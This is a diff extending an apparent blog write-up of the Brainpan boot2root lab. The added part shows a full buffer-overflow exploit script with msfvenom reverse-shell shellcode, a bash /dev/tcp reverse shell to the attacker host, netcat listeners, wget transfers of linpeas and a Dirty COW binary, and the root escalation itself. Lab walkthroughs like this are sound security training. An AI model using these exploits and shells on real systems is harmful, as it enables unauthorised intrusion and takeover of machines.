@@ -468,4 +468,434 @@ I executed the new payload and was pleased to confirm that I had RCE.
 
 ![pop calc](/img/brainpan_pop_calc.png)
 
+#### Generating a test shell payload
+Now that I had code execution, I needed shellcode that was more useful than opening the calculator on my desktop. I generated a reverse shell to my local test environment similarly to how I had generated the `cmd/exec` shellcode.
+
+```
+root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=4444 -v payload -b '\x00' -f python | sed 's/b"/"/'
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1869 bytes
+payload =  ""
+payload += "\xba\x51\x1f\x1b\xee\xd9\xc4\xd9\x74\x24\xf4\x5d"
+payload += "\x33\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\xbc"
+payload += "\xe3\xf9\x1b\xc2\xf4\x7c\xe3\x3a\x05\xe1\x6d\xdf"
+payload += "\x34\x21\x09\x94\x67\x91\x59\xf8\x8b\x5a\x0f\xe8"
+payload += "\x18\x2e\x98\x1f\xa8\x85\xfe\x2e\x29\xb5\xc3\x31"
+payload += "\xa9\xc4\x17\x91\x90\x06\x6a\xd0\xd5\x7b\x87\x80"
+payload += "\x8e\xf0\x3a\x34\xba\x4d\x87\xbf\xf0\x40\x8f\x5c"
+payload += "\x40\x62\xbe\xf3\xda\x3d\x60\xf2\x0f\x36\x29\xec"
+payload += "\x4c\x73\xe3\x87\xa7\x0f\xf2\x41\xf6\xf0\x59\xac"
+payload += "\x36\x03\xa3\xe9\xf1\xfc\xd6\x03\x02\x80\xe0\xd0"
+payload += "\x78\x5e\x64\xc2\xdb\x15\xde\x2e\xdd\xfa\xb9\xa5"
+payload += "\xd1\xb7\xce\xe1\xf5\x46\x02\x9a\x02\xc2\xa5\x4c"
+payload += "\x83\x90\x81\x48\xcf\x43\xab\xc9\xb5\x22\xd4\x09"
+payload += "\x16\x9a\x70\x42\xbb\xcf\x08\x09\xd4\x3c\x21\xb1"
+payload += "\x24\x2b\x32\xc2\x16\xf4\xe8\x4c\x1b\x7d\x37\x8b"
+payload += "\x5c\x54\x8f\x03\xa3\x57\xf0\x0a\x60\x03\xa0\x24"
+payload += "\x41\x2c\x2b\xb4\x6e\xf9\xfc\xe4\xc0\x52\xbd\x54"
+payload += "\xa1\x02\x55\xbe\x2e\x7c\x45\xc1\xe4\x15\xec\x38"
+payload += "\x6f\xda\x59\x42\x62\xb2\x9b\x42\x6d\x1e\x15\xa4"
+payload += "\xe7\x8e\x73\x7f\x90\x37\xde\x0b\x01\xb7\xf4\x76"
+payload += "\x01\x33\xfb\x87\xcc\xb4\x76\x9b\xb9\x34\xcd\xc1"
+payload += "\x6c\x4a\xfb\x6d\xf2\xd9\x60\x6d\x7d\xc2\x3e\x3a"
+payload += "\x2a\x34\x37\xae\xc6\x6f\xe1\xcc\x1a\xe9\xca\x54"
+payload += "\xc1\xca\xd5\x55\x84\x77\xf2\x45\x50\x77\xbe\x31"
+payload += "\x0c\x2e\x68\xef\xea\x98\xda\x59\xa5\x77\xb5\x0d"
+payload += "\x30\xb4\x06\x4b\x3d\x91\xf0\xb3\x8c\x4c\x45\xcc"
+payload += "\x21\x19\x41\xb5\x5f\xb9\xae\x6c\xe4\xc9\xe4\x2c"
+payload += "\x4d\x42\xa1\xa5\xcf\x0f\x52\x10\x13\x36\xd1\x90"
+payload += "\xec\xcd\xc9\xd1\xe9\x8a\x4d\x0a\x80\x83\x3b\x2c"
+payload += "\x37\xa3\x69"
+```
+
+Again, I replaced the previous shellcode with the above payload before opening up a netcat listener on my local desktop. Upon running the exploit I was happy to see that my listener caught a shell.
+
+```
+~> nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 192.168.0.14 49162
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\cb\Desktop\vulns\brainpan>
+```
+
+With a completed exploit I had everything I needed to move on to the real host.
+
+### Getting a shell on the target
+I needed to make a few changes to prepare my shell for my non-lab target. I started by updating the target variable in my exploit to reflect the IP of the lab instance `10.10.42.127` and then regenerated my reverse shell payload to connect back to my attack host. The finalized exploit with these changes looked like.
+
+
+```python
+#!/usr/bin/env python3
+
+import sys
+from pwn import *
+
+# context vars
+context.arch = 'amd64'
+
+# target
+target = remote('10.10.42.127', 9999, typ='tcp')
+
+# target-specific vars
+
+# payload vars
+total_payload_size = 1000
+offset = 524
+overflow = "A" * offset
+retn = "\xf3\x12\x17\x31"
+padding = "\x90" * 16
+bad_chars = "\x00"
+#root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.176.118 LPORT=4444 -v payload -b '\x00' -f python | sed 's/b"/"/'
+payload =  ""
+payload += "\xd9\xc2\xb8\x7f\xdc\xf2\x3e\xd9\x74\x24\xf4\x5a"
+payload += "\x2b\xc9\xb1\x52\x31\x42\x17\x83\xea\xfc\x03\x3d"
+payload += "\xcf\x10\xcb\x3d\x07\x56\x34\xbd\xd8\x37\xbc\x58"
+payload += "\xe9\x77\xda\x29\x5a\x48\xa8\x7f\x57\x23\xfc\x6b"
+payload += "\xec\x41\x29\x9c\x45\xef\x0f\x93\x56\x5c\x73\xb2"
+payload += "\xd4\x9f\xa0\x14\xe4\x6f\xb5\x55\x21\x8d\x34\x07"
+payload += "\xfa\xd9\xeb\xb7\x8f\x94\x37\x3c\xc3\x39\x30\xa1"
+payload += "\x94\x38\x11\x74\xae\x62\xb1\x77\x63\x1f\xf8\x6f"
+payload += "\x60\x1a\xb2\x04\x52\xd0\x45\xcc\xaa\x19\xe9\x31"
+payload += "\x03\xe8\xf3\x76\xa4\x13\x86\x8e\xd6\xae\x91\x55"
+payload += "\xa4\x74\x17\x4d\x0e\xfe\x8f\xa9\xae\xd3\x56\x3a"
+payload += "\xbc\x98\x1d\x64\xa1\x1f\xf1\x1f\xdd\x94\xf4\xcf"
+payload += "\x57\xee\xd2\xcb\x3c\xb4\x7b\x4a\x99\x1b\x83\x8c"
+payload += "\x42\xc3\x21\xc7\x6f\x10\x58\x8a\xe7\xd5\x51\x34"
+payload += "\xf8\x71\xe1\x47\xca\xde\x59\xcf\x66\x96\x47\x08"
+payload += "\x88\x8d\x30\x86\x77\x2e\x41\x8f\xb3\x7a\x11\xa7"
+payload += "\x12\x03\xfa\x37\x9a\xd6\xad\x67\x34\x89\x0d\xd7"
+payload += "\xf4\x79\xe6\x3d\xfb\xa6\x16\x3e\xd1\xce\xbd\xc5"
+payload += "\xb2\xfa\x4b\x75\x34\x93\x49\x75\xa8\x3f\xc7\x93"
+payload += "\xa0\xaf\x81\x0c\x5d\x49\x88\xc6\xfc\x96\x06\xa3"
+payload += "\x3f\x1c\xa5\x54\xf1\xd5\xc0\x46\x66\x16\x9f\x34"
+payload += "\x21\x29\x35\x50\xad\xb8\xd2\xa0\xb8\xa0\x4c\xf7"
+payload += "\xed\x17\x85\x9d\x03\x01\x3f\x83\xd9\xd7\x78\x07"
+payload += "\x06\x24\x86\x86\xcb\x10\xac\x98\x15\x98\xe8\xcc"
+payload += "\xc9\xcf\xa6\xba\xaf\xb9\x08\x14\x66\x15\xc3\xf0"
+payload += "\xff\x55\xd4\x86\xff\xb3\xa2\x66\xb1\x6d\xf3\x99"
+payload += "\x7e\xfa\xf3\xe2\x62\x9a\xfc\x39\x27\xaa\xb6\x63"
+payload += "\x0e\x23\x1f\xf6\x12\x2e\xa0\x2d\x50\x57\x23\xc7"
+payload += "\x29\xac\x3b\xa2\x2c\xe8\xfb\x5f\x5d\x61\x6e\x5f"
+payload += "\xf2\x82\xbb"
+postfix = "C" * (total_payload_size - offset - len(retn) - len(padding) - len(payload))
+
+buffer = "".join([
+    overflow,
+    retn,
+    padding,
+    payload,
+    postfix
+])
+
+# send exploit
+# sending payload
+target.recvuntil(">> ")
+log.info(f"sending payload of {len(buffer)} bytes")
+target.sendline(buffer)
+target.recvuntil("\n")
+
+# cleanup
+target.close()
+sys.exit(0)
+```
+
+I then started a listener and fired off the exploit, happily I caught a shell as a user, `puck`.
+
+```
+Z:\home\puck>dir
+Volume in drive Z has no label.
+Volume Serial Number is 0000-0000
+
+Directory of Z:\home\puck
+
+  3/6/2013   2:23 PM  <DIR>         .
+  3/4/2013  10:49 AM  <DIR>         ..
+  3/6/2013   2:23 PM           513  checksrv.sh
+  3/4/2013   1:45 PM  <DIR>         web
+       1 file                       513 bytes
+       3 directories     13,850,206,208 bytes free
+
+```
+
+While this shell appeared to be `CMD` the directory structure and files immediately did not look like a windows environment so I decided to move on to enumeration quickly.
+
+### Enumerating the Host
+
+I didn't take long for me to realize I was not running within a windows environment.
+
+```
+Z:\>dir
+Volume in drive Z has no label.
+Volume Serial Number is 0000-0000
+
+Directory of Z:\
+
+  3/4/2013  12:02 PM  <DIR>         bin
+  3/4/2013  10:19 AM  <DIR>         boot
+12/22/2020  10:26 PM  <DIR>         etc
+  3/4/2013  10:49 AM  <DIR>         home
+  3/4/2013  10:18 AM    15,084,717  initrd.img
+  3/4/2013  10:18 AM    15,084,717  initrd.img.old
+  3/4/2013  12:04 PM  <DIR>         lib
+  3/4/2013   9:12 AM  <DIR>         lost+found
+  3/4/2013   9:12 AM  <DIR>         media
+ 10/9/2012   8:59 AM  <DIR>         mnt
+  3/4/2013   9:13 AM  <DIR>         opt
+  3/7/2013  10:07 PM  <DIR>         root
+12/22/2020  10:26 PM  <DIR>         run
+  3/4/2013  10:20 AM  <DIR>         sbin
+ 6/11/2012   8:43 AM  <DIR>         selinux
+  3/4/2013   9:13 AM  <DIR>         srv
+12/22/2020  10:34 PM  <DIR>         tmp
+  3/4/2013   9:13 AM  <DIR>         usr
+  8/5/2019   2:47 PM  <DIR>         var
+ 2/25/2013   1:32 PM     5,180,432  vmlinuz
+ 2/25/2013   1:32 PM     5,180,432  vmlinuz.old
+       4 files               40,530,298 bytes
+      17 directories     13,850,206,208 bytes free
+```
+
+But I was excited to find that I could execute commands on this linux machine. With this in mind I decided to leverage a reverse bash shell to migrate into the underlying linux host.
+
+To facilitate this, I generated the shell using msfvenom again before executing this using this directly through `bash`.
+
+```
+root@kali:~/ctf# msfvenom -p cmd/unix/reverse_bash LHOST=10.10.176.118 LPORT=4443
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 66 bytes
+0<&137-;exec 137<>/dev/tcp/10.10.176.118/4443;sh <&137 >&137 2>&137
+```
+
+```
+Z:\>/bin/bash -c "0<&137-;exec 137<>/dev/tcp/10.10.176.118/4443;sh <&137 >&137 2>&137"
+```
+
+```
+root@kali:~/ctf# nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [10.10.176.118] from (UNKNOWN) [10.10.42.127] 51982
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+
+whoami
+puck
+```
+
+Again I caught a raw shell via a listening netcat instance.
+
+### Stabilizing my limited shell to a full TTY
+Given I could be on this shell a while, I wanted to stabilize it to something I couldn't accidentally blow away with a rogue `^c`. I found that the host had python 2.7 on it and decided to use the `import pty` trick to migrate this shell into a new pty.
+
+```
+python --version
+Python 2.7.3
+python -c 'import pty; pty.spawn("/bin/bash")'
+puck@brainpan:/$
+puck@brainpan:/$ ^Z
+[1]+  Stopped                 nc -lvnp 4443
+root@kali:~/ctf# stty raw -echo; fg;
+nc -lvnp 4443
+             ls
+bin   etc         initrd.img.old  media  proc  sbin     sys  var
+boot  home        lib             mnt    root  selinux  tmp  vmlinuz
+dev   initrd.img  lost+found      opt    run   srv      usr  vmlinuz.old
+puck@brainpan:/$ export SHELL=/bin/bash
+puck@brainpan:/$ export TERM=screen
+puck@brainpan:/$
+```
+
+With a stabilized shell, it was time to start enumerating the host for anything valuable.
+
+### Enumerating the linux target
+I decided to use linpeas initially to generate a high-level overview of the host and created a transfer directory that I could uses as a webroot to migrate assets over to the target.
+
+```
+root@kali:~/ctf# mkdir transfer
+root@kali:~/ctf# cd transfer/
+root@kali:~/ctf/transfer# cp ~/Desktop/PEASS/linPEAS/linpeas.sh .
+root@kali:~/ctf/transfer# ls
+linpeas.sh
+root@kali:~/ctf/transfer# python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+
+```
+puck@brainpan:~$ wget 'http://10.10.176.118:8888/linpeas.sh'
+--2020-12-22 22:43:59--  http://10.10.176.118:8888/linpeas.sh
+Connecting to 10.10.176.118:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 222579 (217K) [text/x-sh]
+Saving to: `linpeas.sh'
+
+100%[======================================>] 222,579     --.-K/s   in 0.002s  
+
+2020-12-22 22:43:59 (96.8 MB/s) - `linpeas.sh' saved [222579/222579]
+puck@brainpan:~$ chmod +x linpeas.sh
+puck@brainpan:~$ ./linpeas.sh > /tmp/localenum.txt
+```
+
+I kicked off the script and decided to walk away for a minute considering how strange this host truly was. When I came back I found that the enumeration returned a few potential paths forward. Most interestingly though, it confirmed that the host was running `wine` which explained the cmd.exe and windows binary.
+
+```
+[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/home/puck/.wine/dosdevices/z:/tmp/localenum.txt:USERNAME=puck
+```
+
+Additionally it identified a nopassword root binary that the `puck` user could execute which looked extremely likely as the vector of attack.
+
+```
+[+] Testing 'sudo -l' without password & /etc/sudoers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+```
+
+I wasted roughly 15 minutes prodding at the `anansi_util` binary though before realizing the host might be vulnerable to a dirtycow escalation and that the `anansi_util` binary could have been a red herring.
+
+```
+OS: Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013
+User & Groups: uid=1002(puck) gid=1002(puck) groups=1002(puck)
+Hostname: brainpan
+Writable folder: /home/puck
+```
+
+```
+puck@brainpan:~$ uname -a
+Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
+```
+
+### Building dirtycow
+I decided to reach for the original Christian "FireFart" Mehlmauer implementation of dirtycow because it generated a new user that collided with the root uid/gid, effetively giving me a root user. I pulled down the C code from his repo and fetched the x86 dependencies I needed to build it. My plan was to build a statically linked binary that I could just drop on the host to make my life the easier.
+
+```
+root@kali:~/ctf# wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+root@kali:~/ctf# sed -i dirty.c 's/firefart/cb/g'
+root@kali:~/ctf# dpkg --add-architecture i386
+root@kali:~/ctf# apt-get update && apt-get install -y libcrypt-dev:i386 libc6-dev-i386
+root@kali:~/ctf# gcc -static -m32 -pthread dirty.c -o dirty -lcrypt
+root@kali:~/ctf# ldd dirty
+        not a dynamic executable
+root@kali:~/ctf# readelf -h dirty
+ELF Header:
+  Magic:   7f 45 4c 46 01 01 01 03 00 00 00 00 00 00 00 00 
+  Class:                             ELF32
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - GNU
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Intel 80386
+  Version:                           0x1
+  Entry point address:               0x8049cc0
+  Start of program headers:          52 (bytes into file)
+  Start of section headers:          1288232 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               52 (bytes)
+  Size of program headers:           32 (bytes)
+  Number of program headers:         8
+  Size of section headers:           40 (bytes)
+  Number of section headers:         37
+  Section header string table index: 36
+```
+
+I restarted the python webserver and transfered the malicious binary over to the target.
+
+```
+root@kali:~/ctf# cp dirty transfer/
+root@kali:~/ctf# cd transfer/
+root@kali:~/ctf/transfer# python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+
+```
+puck@brainpan:~$ wget 'http://10.10.176.118:8888/dirty'
+--2020-12-22 23:02:59--  http://10.10.176.118:8888/dirty
+Connecting to 10.10.176.118:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1289712 (1.2M) [application/octet-stream]
+Saving to: `dirty'
+
+100%[======================================>] 1,289,712   --.-K/s   in 0.01s   
+
+2020-12-22 23:02:59 (104 MB/s) - `dirty' saved [1289712/1289712]
+
+puck@brainpan:~$ ls
+checksrv.sh  dirty  linpeas.sh  web
+puck@brainpan:~$ chmod +x dirty
+puck@brainpan:~$ ./dirty 'vu1n3r4b13'
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: vu1n3r4b13
+Complete line:
+cb:fiLqOIF8ICzyk:0:0:pwned:/root:/bin/bash
+
+mmap: b773e000
+```
+
+Executing the coommand output the `cb` user I had expected and it was time to see if my exploit worked.
+
+```
+puck@brainpan:~$ su cb
+Password: 
+cb@brainpan:/home/puck# cd /root
+cb@brainpan:~# pwd
+/root
+cb@brainpan:~# ls
+b.txt
+cb@brainpan:~# cat b.txt 
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+
+                                              http://www.techorganic.com 
+
+
+
+cb@brainpan:~#
+```
+
+SUCCESS! My `cb` user had root permissions and I was able to reach the `/root` directory where I happily viewed the `b.txt` file.
+
 ## Summary
+This host ended up being a rollercoaster having a twist at effectively every step of the attack. I especially enjoyed being able to leverage and old smash-the-stack overflow to gain initial access. To date, this is my favorite boot2root that I've had the pleasure to work through.
